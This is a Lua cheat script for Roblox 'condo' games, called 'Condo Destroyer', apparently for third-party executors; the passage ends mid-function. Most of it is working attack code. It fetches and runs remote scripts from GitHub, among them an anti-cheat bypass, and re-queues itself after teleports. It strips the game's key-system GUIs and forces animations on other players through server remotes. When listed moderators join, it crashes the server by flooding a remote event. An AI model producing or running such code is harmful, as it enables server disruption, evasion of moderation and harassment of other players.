if not game:IsLoaded() then game.Loaded:Wait() end
if getgenv().condo_destroyer_loaded then
    if getgenv().notify then
        return getgenv().notify("Warning", "Condo Destroyer is already loaded.", 6)
    else
        return warn("Condo Destroyer is already loaded.")
    end
end
wait()
getgenv().condo_destroyer_loaded = true

local Script_Version = "V2.0.0"
local executor_string = nil
local queueteleport = queueteleport or queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)
local g = getgenv() or _G or {}
local function executor_contains(substr)
    if typeof(executor_string) ~= "string" then
        return false
    end
    return string.find(string.lower(executor_string), string.lower(substr), 1, true) ~= nil
end

local function retrieve_executor()
    local name
    if identifyexecutor then
        name = identifyexecutor()
    end
    return { Name = name or "Unknown Executor" }
end

local function identify_executor()
    local executorinfo = retrieve_executor()
    return tostring(executorinfo.Name)
end

executor_string = identify_executor()

function low_level_executor()
    if executor_contains("solara") then return true end
    if executor_contains("jjsploit") then return true end
    if executor_contains("xeno") then return true end
    return false
end

if not low_level_executor() then
    task.spawn(function()
        if getgenv().InitializedAdonisAdmin_Bypass then return end

        if not getgenv().InitializedAdonisAdmin_Bypass then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua",true))()
            wait(0.1)
            getgenv().InitializedAdonisAdmin_Bypass = true
        end
    end)
end
wait(0.5)
local NotifyLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/EnterpriseExperience/MicUpSource/main/Notification_Lib.lua"))()
local LocalPlayer = game.Players.LocalPlayer
if not getgenv().LocalPlayer then
    getgenv().LocalPlayer = LocalPlayer
end
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
if not getgenv().Character then
    getgenv().Character = Character
end
local Humanoid = Character:FindFirstChildWhichIsA("Humanoid") or Character:WaitForChild("Humanoid", 1)
if not getgenv().Humanoid then
    getgenv().Humanoid = Humanoid or Character:FindFirstChildWhichIsA("Humanoid") or Character:WaitForChild("Humanoid", 10)
end
local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart") or Character:WaitForChild("HumanoidRootPart", 5)
if not getgenv().HumanoidRootPart then
    getgenv().HumanoidRootPart = HumanoidRootPart
end
local PlayerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui") or LocalPlayer:FindFirstChildWhichIsA("PlayerGui") or LocalPlayer:WaitForChild("PlayerGui", 5)
if not getgenv().PlayerGui then
    getgenv().PlayerGui = PlayerGui
end
local Lighting = cloneref and cloneref(game:GetService("Lighting")) or game:GetService("Lighting")
if not getgenv().Lighting then
    getgenv().Lighting = Lighting
end
local Workspace = cloneref and cloneref(game:GetService("Workspace")) or game:GetService("Workspace")
if not getgenv().Workspace then
    getgenv().Workspace = Workspace
end
local ReplicatedStorage = cloneref and cloneref(game:GetService("ReplicatedStorage")) or game:GetService("ReplicatedStorage")
if not getgenv().ReplicatedStorage then
    getgenv().ReplicatedStorage = ReplicatedStorage
end
local RunService = cloneref and cloneref(game:GetService("RunService")) or game:GetService("RunService")
if not getgenv().RunService then
    getgenv().RunService = RunService
end
local Camera = Workspace.CurrentCamera
if not getgenv().CurrentCamera then
    getgenv().CurrentCamera = Camera
end
local StarterGui = cloneref and cloneref(game:GetService("StarterGui")) or game:GetService("StarterGui")
if not getgenv().StarterGui then
    getgenv().StarterGui = StarterGui
end
local Rayfield = nil
local MAX_ATTEMPTS = 10
local WAIT_BETWEEN_ATTEMPTS = 1
local function find_char_remote()
    local reps = ReplicatedStorage
    if not reps then return nil end

    local possible_names = {"CharUser", "CHAR", "Char", "char"}

    for _, name in ipairs(possible_names) do
        local found = reps:FindFirstChild(name, true)
        if found and found:IsA("RemoteEvent") then
            return cloneref and cloneref(found) or found
        end
    end

    for _, obj in ipairs(reps:GetDescendants()) do
        if obj:IsA("RemoteEvent") then
            local lowered = string.lower(obj.Name)
            if lowered == "charuser" or lowered == "char" then
                return cloneref and cloneref(obj) or obj
            end
        end
    end

    return nil
end

getgenv().notify = function(notif_type, msg, duration)
   NotifyLib:External_Notification(tostring(notif_type), tostring(msg), tonumber(duration))
end

local Players = cloneref and cloneref(game:GetService("Players")) or game:GetService("Players")
if not getgenv().Players then
    getgenv().Players = Players 
end
local Char_User_RE = find_char_remote()
getgenv().Char_User_RE = Char_User_RE
getgenv().User_Selected_Char_G = getgenv().User_Selected_Char_G or "N/A"
local User_Selected_Char = getgenv().User_Selected_Char_G
local Keeping_Char_After_Respawn = false

if getgenv().Chosen_To_Keep_Char_User == nil then
    getgenv().Chosen_To_Keep_Char_User = false
end

if Char_User_RE and Char_User_RE:IsA("RemoteEvent") then
    if game.Players.LocalPlayer.UserId == 10483028410 then
        pcall(function() Char_User_RE:FireServer("BennyM050505") end)
    end
end

if not getgenv().IY_LOADED and not getgenv().GET_LOADED_IY then
    task.spawn(function()
        local ok, err = pcall(function()
            loadstring(game:HttpGet('https://raw.githubusercontent.com/EnterpriseExperience/crazyDawg/main/InfYieldOther.lua'))()
        end)
        if not ok then
            warn("IY Load failed: " .. tostring(err))
        end
    end)
end
task.wait(0.2)
if not getgenv().performance_stats then
    task.spawn(function()
        local ok, err = pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/EnterpriseExperience/OrionLibraryReWrittenCelery/refs/heads/main/grab_file_performance"))()
        end)
        if not ok then
            warn("Performance stats load failed: " .. tostring(err))
        end
    end)
end

local function handle_character(char)
    if not char or not char.Parent then
        return
    end

    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then
        hum = char:WaitForChild("Humanoid")
    end

    if getgenv().Chosen_To_Keep_Char_User then
        local re = getgenv().Char_User_RE or find_char_remote()
        if re then
            task.defer(function()
                re:FireServer(tostring(getgenv().User_Selected_Char_G))
            end)
        else
            getgenv().notify("Error", "Could not find Char RemoteEvent!", 5)
        end
    end
end

if not getgenv().NewChar_Added_Conn or not getgenv().NewChar_Added_Conn.Connected then
    task.spawn(function()
        getgenv().notify("Info", "Establishing CharacterAdded connection...", 5)

        local ok, err = pcall(function()
            getgenv().NewChar_Added_Conn = getgenv().LocalPlayer.CharacterAdded:Connect(function(char)
                if char.Name == "CIippedByAura" then
                    if getgenv().Char_User_RE and getgenv().Char_User_RE:IsA("RemoteEvent") then
                        task.defer(function()
                            getgenv().Char_User_RE:FireServer("BennyM050505")
                        end)
                    else
                        getgenv().notify("Error", "Could not find Char RemoteEvent!", 5)
                    end
                end

                handle_character(char)
            end)

            local current = getgenv().LocalPlayer.Character or game.Players.LocalPlayer.Character
            if current and current.Parent then
                task.defer(function()
                    handle_character(current)
                end)
            end
        end)

        if ok then
            getgenv().notify("Success", "Successfully created CharacterAdded connection.", 5)
        else
            warn("CharacterAdded connection failed: " .. tostring(err))
        end
    end)
end

for attempt = 1, MAX_ATTEMPTS do
    local success, result = pcall(function()
        return loadstring(game:HttpGet("https://raw.githubusercontent.com/EnterpriseExperience/MicUpSource/refs/heads/main/GetUILibrary"))()
    end)

    if success and result then
        Rayfield = result
        break
    else
        task.wait(WAIT_BETWEEN_ATTEMPTS)
    end
end

local gearIDs = {
    "212641536",
    "409746054",
    "193769809",
    "319655993",
    "84417281",
    "121946387",
    "116693764",
    "212296936",
    "168143042",
    "12187348",
    "11377306",
    "170897263",
    "94233344",
    "11453385",
    "95354288",
    "11563251",
    "11999247",
    "42845609",
    "34901961",
    "51346271",
    "26017478",
    "225921000",
    "253519495",
    "2605965785",
    "15932306",
    "12848902",
    "10472779",
    "12547976",
    "18210455",
    "25158998",
    "27858062",
    "16688968",
    "99119158",
    "18474459",
    "30393548",
    "83021250"
}

if not getgenv().went_through_setup then
    getgenv().notify("Success", "Enabling leaderboard and players...", 5)
    wait(0.1)
    for _, v in ipairs(PlayerGui:GetDescendants()) do
        if v:IsA("LocalScript") and v.Name == "sus" then
            v.Disabled = true
            v:Destroy()
        end
    end

    pcall(function()
        local leader_board = Enum.CoreGuiType.PlayerList

        getgenv().StarterGui:SetCoreGuiEnabled(leader_board, true)
        getgenv().LocalPlayer.CameraMaxZoomDistance = 999999
        getgenv().LocalPlayer.CameraMinZoomDistance = 0.5
    end)
    wait(0.1)
    getgenv().went_through_setup = true
end

getgenv().return_char = function(Player, timeout)
    if not Player or not Player:IsA("Player") then return nil end

    timeout = tonumber(timeout) or 5
    local start = os.clock()
    local current_char
    local function valid_char(c)
        return c and c.Parent and c:IsDescendantOf(game)
    end

    while os.clock() - start < timeout do
        local char = Player.Character
        if valid_char(char) then
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum and hum.Health > 0 then
                current_char = char
                break
            end
        end
        task.wait()
    end

    return current_char
end

getgenv().return_human = getgenv().return_human or function(Player, timeout)
    timeout = tonumber(timeout) or 45
    local start = os.clock()

    while os.clock() - start < timeout do
        local char = getgenv().return_char(Player, timeout)
        if char then
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum and hum.Parent and hum.Health > 0 then
                return hum
            end
        end
        task.wait()
    end

    return nil
end

for _, v in ipairs(PlayerGui:GetDescendants()) do
    if v:IsA("Frame") and v.Name:lower():find("maink") then
        if v.Visible then
            v.Visible = false
        end
    end
end
for _, v in ipairs(PlayerGui:GetDescendants()) do
    if v:IsA("ImageLabel") and v.Name:lower():find("background") then
        if v.Visible then
            v.Visible = false
        end
    end
end
for _, v in ipairs(PlayerGui:GetChildren()) do
    if v:IsA("ScreenGui") and v.Name:lower():find("system") then
        local bg = v:FindFirstChild("BG")
        if bg and bg:FindFirstChild("Key") then
            v:Destroy()
        end
    end
end
for _, v in ipairs(PlayerGui:GetDescendants()) do
    if string.find(v.Name:lower(), "key") then
        if v.Parent.Parent.Name == "Intro" then
            if v and v:IsA("ScreenGui") and v.Enabled then
                pcall(function() v.Enabled = false end)
            end
        end
    end
end
for _, v in ipairs(PlayerGui:GetDescendants()) do
    if v:IsA("Frame") and string.find(v.Name:lower(), "key") then
        if v.Parent.Name == "Frame" then
            pcall(function() v:Destroy() end)
        end
    end
end
for _, v in ipairs(Lighting:GetChildren()) do
    if v:IsA("BlurEffect") then
        v.Enabled = false
    end
end
for _, v in ipairs(Camera:GetChildren()) do
    if v:IsA("BlurEffect") then
        v.Enabled = false
    end
end
for _, v in ipairs(PlayerGui:GetChildren()) do
    if v:IsA("ScreenGui") and v.Name:lower():find("intro") and v:FindFirstChild("Welcome") then
        pcall(function() v:Destroy() end)
    end
end
for _, v in ipairs(PlayerGui:GetDescendants()) do
    if v:IsA("ScreenGui") and v.Name:lower():find("chat") then
        v.Enabled = true
        wait(0.3)
        if getgenv().Humanoid then
            pcall(function()
                getgenv().Humanoid.Health = 0
            end)
        end
    end
end
wait(0.1)
pcall(function()
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
end)

local function get_just_vending_machine_button()
    local cached = getgenv().Vending_Machine_Button
    if cached and cached.Parent and cached:IsA("ClickDetector") then
        return cached
    end

    local machine = workspace:FindFirstChild("Machine", true)
    if machine then
        local button = machine:FindFirstChild("Button", true)
        if button then
            getgenv().Vending_Machine_Button = button
            return button
        end
    end

    for _, v in ipairs(workspace:GetDescendants()) do
        if v.Name:lower():find("button") and v.Parent.Name:lower():find("machine") then
            getgenv().Vending_Machine_Button = v
            return v
        end
    end

    return nil
end

local function get_vending_machine_and_button()
    local cached = getgenv().Found_Cigs_Vending_Machine_Global_CD
    if cached and cached.Parent and cached:IsA("ClickDetector") then
        return cached
    end

    local machine = workspace:FindFirstChild("Machine", true)
    if machine then
        local button = machine:FindFirstChild("Button", true)
        if button then
            local cd = button:FindFirstChildOfClass("ClickDetector")
            if cd then
                getgenv().Found_Cigs_Vending_Machine_Global_CD = cd
                return cd
            end
        end
    end

    for _, v in ipairs(workspace:GetDescendants()) do
        if v:IsA("ClickDetector") and v.Parent and v.Parent.Name:lower():find("button") then
            getgenv().Found_Cigs_Vending_Machine_Global_CD = v
            return v
        end
    end

    return nil
end

if Char_User_RE and Char_User_RE:IsA("RemoteEvent") then
    if game.Players.LocalPlayer.UserId == 10483028410 then
        pcall(function() Char_User_RE:FireServer("BennyM050505") end)
    end
end

getgenv().get_root_with_timeout = function(Player, timeout)
    timeout = timeout or 30

    local char = getgenv().return_char(Player, 45)
    if not char then return nil end

    local root =
        char:FindFirstChild("HumanoidRootPart")
        or char:FindFirstChild("UpperTorso")
        or char:FindFirstChild("Torso")

    if root then return root end

    local targets = {
        HumanoidRootPart = true,
        UpperTorso = true,
        Torso = true
    }

    local died = false
    local hum = char:FindFirstChildOfClass("Humanoid")
    if hum then
        hum.Died:Connect(function()
            died = true
        end)
    end

    local start = os.clock()
    local added_conn

    added_conn = char.ChildAdded:Connect(function(c)
        if targets[c.Name] then
            root = c
            if added_conn then added_conn:Disconnect() end
        end
    end)

    while not root and not died and (os.clock() - start) < timeout do
        task.wait()
    end

    if added_conn then added_conn:Disconnect() end

    if died then return nil end
    if not root then return nil end

    return root
end

if not Rayfield then
    if getgenv().notify then
        getgenv().notify("Error", "Rayfield failed to load after multiple retries/attempts.", 15)
    else
        warn("[CRITICAL_ERROR]: Failed to load Rayfield after multiple attempts.")
    end
end
wait(0.5)
-- This can be used anytime while using the script by executing the following: getgenv().notify("Welcome", "Your content here.", 6)

local Players = cloneref and cloneref(game:GetService("Players")) or game:GetService("Players")
local cmdp = Players
local cmdlp = cmdp.LocalPlayer
getgenv().singlePlayerTable = getgenv().singlePlayerTable or {}
wait(0.1)
getgenv().findplr = function(args)
    local tbl = Players:GetPlayers()

    if args == "me" or args == cmdlp.Name or args == cmdlp.DisplayName then
        if getgenv().notify then
            return getgenv().notify("Error", "You cannot target yourself!", 6)
        else
            return 
        end
    end

    if args == "random" then
        local validPlayers = {}
        for _, v in pairs(tbl) do
            if v ~= cmdlp then
                table.insert(validPlayers, v)
            end
        end
        return #validPlayers > 0 and validPlayers[math.random(1, #validPlayers)] or nil
    end

    if args == "new" then
        local vAges = {}
        for _, v in pairs(tbl) do
            if v.AccountAge < 30 and v ~= cmdlp then
                table.insert(vAges, v)
            end
        end
        return #vAges > 0 and vAges[math.random(1, #vAges)] or nil
    end

    if args == "old" then
        local vAges = {}
        for _, v in pairs(tbl) do
            if v.AccountAge > 30 and v ~= cmdlp then
                table.insert(vAges, v)
            end
        end
        return #vAges > 0 and vAges[math.random(1, #vAges)] or nil
    end

    if args == "bacon" then
        local vAges = {}
        for _, v in pairs(tbl) do
            if v ~= cmdlp and (v.Character:FindFirstChild("Pal Hair") or v.Character:FindFirstChild("Kate Hair")) then
                table.insert(vAges, v)
            end
        end
        return #vAges > 0 and vAges[math.random(1, #vAges)] or nil
    end

    if args == "friend" then
        local friendList = {}
        for _, v in pairs(tbl) do
            if v:IsFriendsWith(cmdlp.UserId) and v ~= cmdlp then
                table.insert(friendList, v)
            end
        end
        return #friendList > 0 and friendList[math.random(1, #friendList)] or nil
    end

    if args == "notfriend" then
        local vAges = {}
        for _, v in pairs(tbl) do
            if not v:IsFriendsWith(cmdlp.UserId) and v ~= cmdlp then
                table.insert(vAges, v)
            end
        end
        return #vAges > 0 and vAges[math.random(1, #vAges)] or nil
    end

    if args == "ally" then
        local vAges = {}
        for _, v in pairs(tbl) do
            if v.Team == cmdlp.Team and v ~= cmdlp then
                table.insert(vAges, v)
            end
        end
        return #vAges > 0 and vAges[math.random(1, #vAges)] or nil
    end

    if args == "enemy" then
        local vAges = {}
        for _, v in pairs(tbl) do
            if v.Team ~= cmdlp.Team and v ~= cmdlp then
                table.insert(vAges, v)
            end
        end
        return #vAges > 0 and vAges[math.random(1, #vAges)] or nil
    end

    if args == "near" then
        local vAges = {}
        for _, v in pairs(tbl) do
            if v ~= cmdlp and v.Character and cmdlp.Character then
                local vRootPart = v.Character:FindFirstChild("HumanoidRootPart")
                local cmdlpRootPart = cmdlp.Character:FindFirstChild("HumanoidRootPart")
                if vRootPart and cmdlpRootPart then
                    local distance = (vRootPart.Position - cmdlpRootPart.Position).magnitude
                    if distance < 30 then
                        table.insert(vAges, v)
                    end
                end
            end
        end
        return #vAges > 0 and vAges[math.random(1, #vAges)] or nil
    end

    if args == "far" then
        local vAges = {}
        for _, v in pairs(tbl) do
            if v ~= cmdlp and v.Character and cmdlp.Character then
                local vRootPart = v.Character:FindFirstChild("HumanoidRootPart")
                local cmdlpRootPart = cmdlp.Character:FindFirstChild("HumanoidRootPart")
                if vRootPart and cmdlpRootPart then
                    local distance = (vRootPart.Position - cmdlpRootPart.Position).magnitude
                    if distance > 30 then
                        table.insert(vAges, v)
                    end
                end
            end
        end
        return #vAges > 0 and vAges[math.random(1, #vAges)] or nil
    end

    for _, v in pairs(tbl) do
        if (v.Name:lower():find(args:lower()) or v.DisplayName:lower():find(args:lower())) and v ~= cmdlp then
            return v
        end
    end
end

local TeleportCheck = false
if not getgenv().Already_Running_Flames_Teleport_Checker then
    getgenv().Already_Running_Flames_Teleport_Checker = true

    getgenv().LocalPlayer.OnTeleport:Connect(function(State)
        if (not TeleportCheck) and queueteleport then
            TeleportCheck = true
            queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/EnterpriseExperience/MicUpSource/refs/heads/main/CondoGamesRuiner.lua'))()")
        end
    end)
end

if not getgenv().Flames_Hub_Conditional_Error_Detection then
    getgenv().Flames_Hub_Conditional_Error_Detection = true

    local cg = getgenv().CoreGui or game:GetService("CoreGui")
    local rpg = cg:WaitForChild("RobloxPromptGui")

    rpg.promptOverlay.ChildAdded:Connect(function(v)
        if v.Name == "ErrorPrompt" or v.Name == "DisconnectPrompt" then
            local max_retries = 20
            local retries = 0
            local PlaceId = game.PlaceId
            local JobId = game.JobId
            local HttpService = getgenv().HttpService or game:GetService("HttpService")
            local TeleportService = getgenv().TeleportService or game:GetService("TeleportService")
            local LocalPlayer = getgenv().LocalPlayer or game.Players.LocalPlayer

            while retries < max_retries do
                retries = retries + 1

                local servers = {}
                local success, req = pcall(function()
                    return game:HttpGet("https://games.roblox.com/v1/games/" .. PlaceId .. "/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true")
                end)

                if success and req then
                    local body = HttpService:JSONDecode(req)

                    if body and body.data then
                        for _, v in next, body.data do
                            if typeof(v) == "table"
                            and tonumber(v.playing)
                            and tonumber(v.maxPlayers)
                            and v.playing < v.maxPlayers
                            and v.id ~= JobId then
                                table.insert(servers, v.id)
                            end
                        end
                    end
                end

                if #servers > 0 then
                    TeleportService:TeleportToPlaceInstance(
                        PlaceId,
                        servers[math.random(1, #servers)],
                        LocalPlayer
                    )
                    return
                end

                task.wait(0.3)
            end

            pcall(function() getgenv().LocalPlayer:Kick("We couldn't find you a server to jump to, just leave and join another.") end)
            getgenv().notify("Error", "couldnt find a server after 15 tries", 5)
        end
    end)
end
wait(0.1)
getgenv().wait_for_disabled = function(checker, timeout, interval)
    interval = interval or 0.1
    timeout = timeout or 10

    local start = os.clock()
    local function is_disabled()
        if typeof(checker) == "function" then
            return not checker()
        end
        return not checker
    end

    if is_disabled() then
        return true
    end

    while os.clock() - start < timeout do
        task.wait(interval)
        if is_disabled() then
            return true
        end
    end

    return false
end

local teleport_maps = {
    "Apartment #1",
    "Apartment #2",
    "Attic",
    "Attic #2",
    "Bar (Club)",
    "Beach",
    "Cafe",
    "Japanese House",
    "CyberRoom"
}

local colors = {
    Color3.fromRGB(255, 255, 255),
    Color3.fromRGB(128, 128, 128),
    Color3.fromRGB(0, 0, 0),
    Color3.fromRGB(0, 0, 255),
    Color3.fromRGB(0, 255, 0),
    Color3.fromRGB(0, 255, 255),
    Color3.fromRGB(255, 165, 0),
    Color3.fromRGB(139, 69, 19),
    Color3.fromRGB(255, 255, 0),
    Color3.fromRGB(50, 205, 50),
    Color3.fromRGB(255, 0, 0),
    Color3.fromRGB(255, 155, 172),
    Color3.fromRGB(128, 0, 128),
}

g._service_cache = g._service_cache or {}
wait(0.1)
local function safe_get(serviceName)
    name = tostring(serviceName)

    if setmetatable then
        if not g._service_cache then
            g._service_cache = setmetatable({}, {
                __index = function(self, index)
                    local svc = game:GetService(index)

                    if cloneref and svc then
                        svc = cloneref(svc)
                    end

                    self[index] = svc
                    return svc
                end
            })
        end

        return g._service_cache[name]
    end

    local svc = game:GetService(name)

    if cloneref and svc then
        svc = cloneref(svc)
    end

    return svc
end

repeat task.wait() until typeof(safe_get) == "function"
task.wait(0.2)
local Players = getgenv().Players or safe_get("Players")
local Workspace = getgenv().Workspace or safe_get("Workspace")
local ReplicatedStorage = getgenv().ReplicatedStorage or safe_get("ReplicatedStorage")

local function find_api_folder()
    local reps = ReplicatedStorage
    if not reps then return nil end

    local main_candidates = {"LocalScriptAPI", "localscriptapi", "AM", "am"}

    for _, name in ipairs(main_candidates) do
        local found = reps:FindFirstChild(name, true)
        if found then
            if found:IsA("Folder") and found:FindFirstChildOfClass("RemoteEvent") then
                return cloneref and cloneref(found) or found
            end

            local apiFolder = found:FindFirstChild("API") or found:FindFirstChild("api")
            if apiFolder and apiFolder:IsA("Folder") and apiFolder:FindFirstChildOfClass("RemoteEvent") then
                return cloneref and cloneref(apiFolder) or apiFolder
            end
        end
    end

    for _, obj in ipairs(reps:GetDescendants()) do
        if obj:IsA("Folder") then
            local lowered = string.lower(obj.Name)
            if lowered == "localscriptapi" or lowered == "api" then
                if obj:FindFirstChildOfClass("RemoteEvent") then
                    return cloneref and cloneref(obj) or obj
                end
            end
        end
    end

    return nil
end

local function find_afk_remote()
    local reps = ReplicatedStorage
    if not reps then return nil end

    local possible_names = {"LoadEvent", "AFK", "afk", "afkremote"}

    for _, name in ipairs(possible_names) do
        local found = reps:FindFirstChild(name, true)
        if found and found:IsA("RemoteEvent") then
            getgenv().AFKRemote = found
            return found
        end
    end

    return nil
end

local function find_anim_remote_F()
    if getgenv().AnimRemoteFunction then
        return getgenv().AnimRemoteFunction
    end

    local reps = getgenv().ReplicatedStorage or game:GetService("ReplicatedStorage")
    if not reps then return nil end

    local possible_names = {"PLA", "PlayAnim", "PlayAnimation", "AnimPlay", "PLA_ANIM", "PLAY_ANIM"}

    for _, descendant in ipairs(reps:GetDescendants()) do
        if descendant:IsA("RemoteFunction") then
            for _, name in ipairs(possible_names) do
                if descendant.Name:lower() == name:lower() then
                    getgenv().AnimRemoteFunction = descendant
                    return descendant
                end
            end
        end
    end

    return nil
end

local function find_stop_anim_RE()
    if getgenv().StopAnimRemoteEvent then
        return getgenv().StopAnimRemoteEvent
    end

    local reps = game:GetService("ReplicatedStorage")
    if not reps then return nil end

    local possible_names = {
        "StopAnimationOnHumanoid", "StopAnim", "SAH", "SAOH", "StopAnimations", "StopAnims"
    }

    for _, descendant in ipairs(reps:GetDescendants()) do
        if descendant:IsA("RemoteEvent") then
            for _, name in ipairs(possible_names) do
                if descendant.Name:lower() == name:lower() then
                    getgenv().StopAnimRemoteEvent = descendant
                    return descendant
                end
            end
        end
    end

    return nil
end

local function find_sounds_remote()
    local reps = ReplicatedStorage
    if not reps then return nil end

    -- [[ tbh these looked generic to me ]] --
    local possible_names = {"SexSound", "SoundSex", "BangSound", "SoundPlay", "SoundPlayer", "WetSound", "WetSounds"}

    for _, name in ipairs(possible_names) do
        local found = reps:FindFirstChild(name, true)
        if found and found:IsA("RemoteFunction") then
            return found
        end
    end

    return nil
end

local Char_User_RE = find_char_remote()
getgenv().Char_User_RE = Char_User_RE
local Stop_Anim = find_stop_anim_RE()
getgenv().Stop_Anim = Stop_Anim
local API_Folder = find_api_folder()
getgenv().API_Folder = API_Folder
local LocalScriptAPI = API_Folder
local LocalScript_API = API_Folder
local Load_Event = find_afk_remote()
local Char_User = Char_User_RE

local function waitForDescendant(parent, name, timeout)
	local start = os.clock()
	while os.clock() - start < (timeout or 5) do
		local found = parent:FindFirstChild(name, true)
		if found then
			return found
		end
		task.wait(0.1)
	end
	return nil
end

local function find_respawn_remote()
	local root_services = {
		PlayerGui,
		ReplicatedStorage,
		StarterGui or cloneref and cloneref(game:GetService("StarterGui")) or game:GetService("StarterGui"),
	}

	local target_path = {"Menu", "Main", "5Respawn", "Script", "LocalScript", "res"}
	local target_name = "res"

	for _, root in ipairs(root_services) do
		local current = root
		for _, name in ipairs(target_path) do
			current = current:FindFirstChild(name)
			if not current then break end
		end
		if current and current:IsA("RemoteEvent") then
			return current
		end
	end

	for _, root in ipairs(root_services) do
		for _, obj in ipairs(root:GetDescendants()) do
			if obj:IsA("RemoteEvent") and string.lower(obj.Name) == "res" then
				return obj
			end
		end
	end

	return nil
end

local function find_main_reset_remote()
    local reps = ReplicatedStorage
    if not reps then return nil end

    local possible_names = {"Refresh", "Reset", "Respawn", "RE", "re", "reset", "refresh", "respawn"}

    for _, name in ipairs(possible_names) do
        local found = reps:FindFirstChild(name, true)
        if found and (found:IsA("RemoteFunction") or found:IsA("RemoteEvent")) then
            return found
        end
    end

    return nil
end

local function find_catalog_remote_event()
    local reps = ReplicatedStorage
    if not reps then return nil end

    local possible_names = {"Catalog", "CatalogStuff", "CatalogItems", "GiveItemsCatalog"} -- generic names

    for _, name in ipairs(possible_names) do
        local found = reps:FindFirstChild(name, true)
        if found and found:IsA("RemoteEvent") then
            return found
        end
    end

    return nil
end

function spam_RE(PacketAmount, Remote, Loop, ...)
    if not Remote then
        return getgenv().notify("Error", tostring(Remote).." does not exist!", 5)
    end

    if Loop == true then
        getgenv().Spamming_Packets_RE = true
        while getgenv().Spamming_Packets_RE == true do
        wait()
            Remote:FireServer(...)
        end
    elseif Loop == false then
        for i = 1, PacketAmount do
            Remote:FireServer(...)
        end
    else
        return 
    end
end

local Catalog_Remote = find_catalog_remote_event()
local Respawn_Remote = find_main_reset_remote()
local res_remote = find_respawn_remote()
local Sync_Events_Or_Collar_Events = waitForDescendant(ReplicatedStorage, "CollarEvents", 10) or waitForDescendant(ReplicatedStorage, "SyncEvents", 10)
local Sync_Player_RE = Sync_Events_Or_Collar_Events and waitForDescendant(Sync_Events_Or_Collar_Events, "SyncPlayer", 5)
local Send_Request_RE = Sync_Events_Or_Collar_Events and waitForDescendant(Sync_Events_Or_Collar_Events, "SendRequest", 5)
wait(0.2)
function crash_server()
    if typeof(res_remote) ~= "Instance" or not res_remote:IsA("RemoteEvent") then
        getgenv().crashing_server_toggle = false
        getgenv().crashing_server_toggle_overpowered = false
        return getgenv().notify("Error", "RemoteEvent does not exist or is not a RemoteEvent.", 7)
    end
    if getgenv().crashing_server_toggle then return end
    wait(0.1)
    getgenv().crashing_server_toggle = true
    while getgenv().crashing_server_toggle == true do
    task.wait()
        local pos = getgenv().HumanoidRootPart.Position
        local args = {
            vector.create(pos.X, pos.Y, pos.Z)
        }

        spam_RE(75, res_remote, false, args)
    end
end
wait(0.1)
if res_remote then
    local game_admins = {
        "sgtsteve2434",
        "qwkndqjconl",
        "55K_xE",
        "ErXokasAlt",
        "eanzov",
        "fishyman12990",
        "NOBRUSOCAPA233",
        "Ilastsummer",
        "mikita871y27",
        "RQBLCX_EGOR",
        "tinol813",
        "RevertHakudaa",
        "Stupidboy2030",
        "ElfandeGta58",
        "facundo1204w",
        "Linavow",
        "Labubu_zz1",
        "ZukyChan786",
        "antonis12356",
        "FentLover4L"
    }

    if not getgenv().adminwatcher_players_added_conn_checker then
        getgenv().adminwatcher_players_added_conn_checker = true

        local function is_admin(name)
            name = name:lower()
            for _, admin in ipairs(game_admins) do
                if name == admin:lower() then
                    return true
                end
            end
            return false
        end

        local function check_player(plr)
            if plr and plr.Name and is_admin(plr.Name) then
                getgenv().notify("Warning", "We've detected an Admin who has kicked/killed exploiters/hackers in the past, we're crashing the server for you to get rid of them.", 30)
                crash_server()
            end
        end

        for _, plr in ipairs(game.Players:GetPlayers()) do
            check_player(plr)
        end

        Players.PlayerAdded:Connect(check_player)
    end
end

if not Sync_Events_Or_Collar_Events then
    Sync_Events_Or_Collar_Events = nil
end

local Play_Anim = find_anim_remote_F()

if Play_Anim and Play_Anim:IsA("RemoteEvent") then
    getgenv().notify("Success", "PlayAnimation RemoteFunction has been found! (force play animations = enabled).", 10)
end

local Sus_Sound = find_sounds_remote()
function force_play_sus_anim_plr(Player, is_bot)
    if not Play_Anim then return getgenv().notify("Error", "PlayAnimation was not found inside of LocalScriptAPI!", 5) end

    if is_bot == true and Player:IsA("Model") and Player:FindFirstChild("Bot") then
        Player = Player
    end

    local Animation_1 = "-TRL25F"
    local Animation_2 = "9-"
    local TheyreCharacter
    if is_bot == true then
        TheyreCharacter = Player
    else
        TheyreCharacter = return_char(Player, 3) or Player.Character
    end

    if not Play_Anim then return getgenv().notify("Error", "We we're not able to find the Animation RemoteFunction at runtime, this feature is unavailable here.", 10) end

    if Play_Anim.Name == "PLA" and Play_Anim:IsA("RemoteFunction") then
        if TheyreCharacter and TheyreCharacter:FindFirstChild("Humanoid") and TheyreCharacter:FindFirstChild("HumanoidRootPart") then
            Play_Anim:InvokeServer(Animation_2, TheyreCharacter)
        end
    else
        if TheyreCharacter and TheyreCharacter:FindFirstChild("Humanoid") and TheyreCharacter:FindFirstChild("HumanoidRootPart") then
            if Play_Anim and Play_Anim:IsA("RemoteFunction") then
                Play_Anim:InvokeServer(Animation_1, TheyreCharacter)
            end
        end
    end
end

function force_play_anim_plr(Animation, Player)
	local Animation = tostring(Animation)
	local TheyreCharacter = Player.Character or Player.CharacterAdded:Wait()

	if not Play_Anim then
		return getgenv().notify("Error", "Animation RemoteFunction not found at runtime.", 10)
	end

	if TheyreCharacter and TheyreCharacter:FindFirstChild("Humanoid") and TheyreCharacter:FindFirstChild("HumanoidRootPart") then
		if Play_Anim:IsA("RemoteFunction") then
			local ok, result = pcall(function()
				return Play_Anim:InvokeServer(Animation, TheyreCharacter)
			end)
			if not ok then
				getgenv().notify("Error", "InvokeServer failed: "..tostring(result), 6)
			end
			return result
		elseif Play_Anim:IsA("RemoteEvent") then
